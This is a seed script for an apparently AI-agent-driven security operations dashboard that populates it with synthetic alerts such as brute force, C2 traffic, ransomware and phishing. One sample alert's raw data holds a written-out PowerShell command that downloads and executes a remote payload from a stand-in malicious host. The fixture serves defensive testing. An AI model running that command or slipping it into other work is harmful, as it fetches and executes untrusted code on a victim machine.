const { models } = require('../models/index');
const { v4: uuidv4 } = require('uuid');

const seedAlerts = async (organizationId, assets) => {
  // Comprehensive alert data based on mockData.ts
  const alertsData = [
    {
      id: '550e8400-e29b-41d4-a716-446655440020',
      title: 'Malware Detection: Suspicious PowerShell Activity',
      description: 'Detected suspicious PowerShell execution attempting to download external payloads',
      severity: 5,
      status: 'new',
      sourceSystem: 'Windows Defender ATP',
      eventTime: new Date('2024-01-15T10:30:00Z'),
      assetId: assets[0]?.id,
      assetName: assets[0]?.name || 'DC-SERVER-01',
      organizationId,
      rawData: {
        processName: 'powershell.exe',
        commandLine: 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://malicious-site.com/payload\')"',
        parentProcess: 'winlogon.exe',
        userId: 'SYSTEM'
      },
      enrichmentData: {
        mitreTactics: ['Initial Access', 'Execution'],
        mitreT1059: 'Command and Scripting Interpreter: PowerShell',
        riskScore: 95,
        iocMatches: ['malicious-site.com']
      },
      assignedAgent: 'SOC Analyst Agent',
      securityEventType: 'malware_detection',
      eventTags: [
        { tag: 'powershell', category: 'technical', confidence: 0.95, reasoning: 'PowerShell execution detected in command line' },
        { tag: 'malware', category: 'behavioral', confidence: 0.92, reasoning: 'Suspicious download behavior matches malware patterns' },
        { tag: 'command-injection', category: 'technical', confidence: 0.88, reasoning: 'Command line injection pattern detected' },
        { tag: 'external-download', category: 'behavioral', confidence: 0.90, reasoning: 'External payload download attempted' },
        { tag: 'high-risk', category: 'contextual', confidence: 0.93, reasoning: 'High severity combined with suspicious behavior' },
        { tag: 'mitre-t1059', category: 'correlation', confidence: 0.89, reasoning: 'Matches MITRE ATT&CK technique T1059' }
      ],
      tagsConfidence: 91.2,
      tagsGeneratedAt: new Date('2024-01-15T10:31:00Z'),
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440021',
      title: 'Multiple Failed Login Attempts',
      description: 'Detected 15 failed login attempts from external IP in 5 minutes',
      severity: 4,
      status: 'investigating',
      sourceSystem: 'Windows Event Logs',
      eventTime: new Date('2024-01-15T10:15:00Z'),
      assetId: assets[0]?.id,
      assetName: assets[0]?.name || 'DC-SERVER-01',
      organizationId,
      rawData: {
        sourceIp: '203.0.113.45',
        targetUser: 'administrator',
        failureReason: 'Invalid credentials',
        attemptCount: 15
      },
      enrichmentData: {
        geoLocation: 'China',
        reputation: 'Known malicious IP',
        riskScore: 85,
        iocMatches: ['203.0.113.45']
      },
      assignedAgent: 'SOC Analyst Agent',
      securityEventType: 'brute_force_attack',
      eventTags: [
        { tag: 'brute-force', category: 'behavioral', confidence: 0.94, reasoning: 'Multiple failed login attempts from single source' },
        { tag: 'external-ip', category: 'technical', confidence: 0.92, reasoning: 'Attack originates from external IP address' },
        { tag: 'credential-attack', category: 'behavioral', confidence: 0.91, reasoning: 'Targeting user credentials through repeated attempts' },
        { tag: 'china-geolocation', category: 'contextual', confidence: 0.87, reasoning: 'Source IP geographically located in China' },
        { tag: 'administrator-target', category: 'contextual', confidence: 0.89, reasoning: 'Targeting administrator account specifically' }
      ],
      tagsConfidence: 90.6,
      tagsGeneratedAt: new Date('2024-01-15T10:16:00Z'),
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440022',
      title: 'Suspicious Network Traffic',
      description: 'Unusual outbound traffic pattern detected to known C2 infrastructure',
      severity: 4,
      status: 'new',
      sourceSystem: 'Network IDS',
      eventTime: new Date('2024-01-15T10:25:00Z'),
      assetId: assets[1]?.id,
      assetName: assets[1]?.name || 'WEB-SERVER-01',
      organizationId,
      rawData: {
        sourceIp: '10.0.1.20',
        destinationIp: '198.51.100.67',
        protocol: 'TCP',
        port: 443,
        bytesTransferred: 1048576
      },
      enrichmentData: {
        c2Category: 'Command and Control',
        threatFamily: 'Cobalt Strike',
        riskScore: 88,
        iocMatches: ['198.51.100.67']
      },
      assignedAgent: 'Threat Intelligence Agent',
      securityEventType: 'suspicious_traffic',
      eventTags: [
        { tag: 'c2-communication', category: 'behavioral', confidence: 0.93, reasoning: 'Communication pattern matches command and control infrastructure' },
        { tag: 'cobalt-strike', category: 'technical', confidence: 0.88, reasoning: 'Traffic signatures match Cobalt Strike framework' },
        { tag: 'outbound-https', category: 'technical', confidence: 0.91, reasoning: 'Suspicious HTTPS outbound communication' },
        { tag: 'large-transfer', category: 'behavioral', confidence: 0.85, reasoning: 'Unusually large data transfer volume' },
        { tag: 'threat-intel-match', category: 'correlation', confidence: 0.92, reasoning: 'Destination IP matches threat intelligence feeds' }
      ],
      tagsConfidence: 89.8,
      tagsGeneratedAt: new Date('2024-01-15T10:26:00Z'),
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440023',
      title: 'File Integrity Monitoring Alert',
      description: 'Critical system file modified unexpectedly',
      severity: 3,
      status: 'resolved',
      sourceSystem: 'OSSEC',
      eventTime: new Date('2024-01-15T09:45:00Z'),
      assetId: assets[1]?.id,
      assetName: assets[1]?.name || 'WEB-SERVER-01',
      organizationId,
      rawData: {
        filePath: '/etc/passwd',
        action: 'modified',
        oldHash: 'a1b2c3d4e5f6',
        newHash: 'f6e5d4c3b2a1',
        modifier: 'root'
      },
      enrichmentData: {
        changeType: 'Authorized maintenance',
        approvedBy: 'System Administrator',
        riskScore: 25
      },
      assignedAgent: 'SOC Analyst Agent',
      securityEventType: 'file_integrity_violation',
    },
    {
      id: '550e8400-e29b-41d4-a716-446655440024',
      title: 'DDoS Attack Detection',
      description: 'High volume of requests from multiple sources targeting web server',
      severity: 4,
      status: 'investigating',
      sourceSystem: 'Web Application Firewall',
      eventTime: new Date('2024-01-15T10:20:00Z'),
      assetId: assets[1]?.id,
      assetName: assets[1]?.name || 'WEB-SERVER-01',
      organizationId,
      rawData: {
        requestCount: 10000,
        timeWindow: '60 seconds',
        topSourceIps: ['203.0.113.10', '203.0.113.11', '203.0.113.12'],
        targetEndpoint: '/api/v1/login'
      },
      enrichmentData: {
        attackType: 'HTTP Flood',
        botnetFamily: 'Mirai',
        riskScore: 78,
        mitigationActive: true
      },
      assignedAgent: 'Incident Response Agent',
      securityEventType: 'ddos_attack',
    },
  ];

  // Generate additional alerts with varied patterns for testing
  const additionalAlertTemplates = [
    {
      title: 'Ransomware Encryption Activity',
      description: 'Suspicious file encryption patterns detected',
      severity: 5,
      sourceSystem: 'Endpoint Detection',
      enrichmentData: { threatFamily: 'Ransomware', riskScore: 95 },
      securityEventType: 'ransomware'
    },
    {
      title: 'Privilege Escalation Attempt',
      description: 'Unauthorized privilege escalation detected',
      severity: 4,
      sourceSystem: 'Security Monitoring',
      enrichmentData: { mitreTactics: ['Privilege Escalation'], riskScore: 82 },
      securityEventType: 'privilege_escalation'
    },
    {
      title: 'Suspicious Email Attachment',
      description: 'Malicious email attachment bypassed initial filters',
      severity: 3,
      sourceSystem: 'Email Security Gateway',
      enrichmentData: { threatType: 'Phishing', riskScore: 70 },
      securityEventType: 'phishing'
    },
    {
      title: 'Database Access Anomaly',
      description: 'Unusual database query patterns detected',
      severity: 4,
      sourceSystem: 'Database Activity Monitor',
      enrichmentData: { dataAccess: 'Sensitive', riskScore: 80 },
      securityEventType: 'unauthorized_data_access'
    },
    {
      title: 'USB Device Policy Violation',
      description: 'Unauthorized USB device connected',
      severity: 2,
      sourceSystem: 'Device Control',
      enrichmentData: { policyViolation: 'USB-001', riskScore: 45 },
      securityEventType: 'policy_violation'
    }
  ];

  // Generate 20 additional alerts with varied timestamps and properties
  for (let i = 0; i < 20; i++) {
    const template = additionalAlertTemplates[i % additionalAlertTemplates.length];
    const asset = assets[i % assets.length];
    const statuses = ['new', 'incident_likely', 'review_required', 'analysis_uncertain', 'investigating', 'resolved', 'false_positive'];
    const agents = ['SOC Analyst Agent', 'Incident Response Agent', 'Threat Intelligence Agent'];
    
    // Create date within last 30 days
    const daysAgo = Math.floor(Math.random() * 30);
    const alertTime = new Date();
    alertTime.setDate(alertTime.getDate() - daysAgo);
    
    // Generate sample tags for some alerts
    const sampleTagSets = [
      [
        { tag: 'encryption', category: 'technical', confidence: 0.91, reasoning: 'File encryption activity detected' },
        { tag: 'ransomware', category: 'behavioral', confidence: 0.89, reasoning: 'Pattern matches known ransomware behavior' },
        { tag: 'file-modification', category: 'technical', confidence: 0.94, reasoning: 'Multiple file modifications detected' }
      ],
      [
        { tag: 'privilege-escalation', category: 'behavioral', confidence: 0.87, reasoning: 'Unauthorized privilege elevation attempt' },
        { tag: 'system-exploitation', category: 'technical', confidence: 0.82, reasoning: 'System vulnerability exploitation detected' }
      ],
      [
        { tag: 'phishing', category: 'behavioral', confidence: 0.85, reasoning: 'Email attachment characteristics match phishing patterns' },
        { tag: 'social-engineering', category: 'contextual', confidence: 0.78, reasoning: 'Content designed to deceive users' }
      ],
      [
        { tag: 'database-anomaly', category: 'behavioral', confidence: 0.86, reasoning: 'Unusual database access pattern' },
        { tag: 'data-exfiltration', category: 'behavioral', confidence: 0.79, reasoning: 'Potential data extraction attempt' }
      ],
      [
        { tag: 'policy-violation', category: 'contextual', confidence: 0.92, reasoning: 'USB device policy violation detected' },
        { tag: 'device-control', category: 'technical', confidence: 0.88, reasoning: 'Unauthorized device connection' }
      ]
    ];

    const tagSet = sampleTagSets[i % sampleTagSets.length];
    const hasGeneratedTags = Math.random() > 0.3; // 70% chance of having tags
    
    alertsData.push({
      id: uuidv4(),
      title: `${template.title} #${i + 1}`,
      description: template.description,
      severity: template.severity + (Math.random() > 0.8 ? 1 : 0), // Occasionally bump severity
      status: statuses[Math.floor(Math.random() * statuses.length)],
      sourceSystem: template.sourceSystem,
      eventTime: alertTime,
      assetId: asset?.id,
      assetName: asset?.name || `UNKNOWN-${i}`,
      organizationId,
      rawData: {
        generatedAlert: true,
        alertIndex: i,
        randomSeed: Math.random()
      },
      enrichmentData: template.enrichmentData,
      assignedAgent: agents[Math.floor(Math.random() * agents.length)],
      securityEventType: template.securityEventType,
      eventTags: hasGeneratedTags ? tagSet : [],
      tagsConfidence: hasGeneratedTags ? Math.round((tagSet.reduce((sum, tag) => sum + tag.confidence, 0) / tagSet.length) * 100) : null,
      tagsGeneratedAt: hasGeneratedTags ? new Date(alertTime.getTime() + 60000) : null, // 1 minute after alert
      createdAt: alertTime,
      updatedAt: alertTime,
    });
  }

  const alerts = await models.Alert.bulkCreate(alertsData, {
    returning: true,
    ignoreDuplicates: true,
  });

  return alerts;
};

module.exports = { seedAlerts };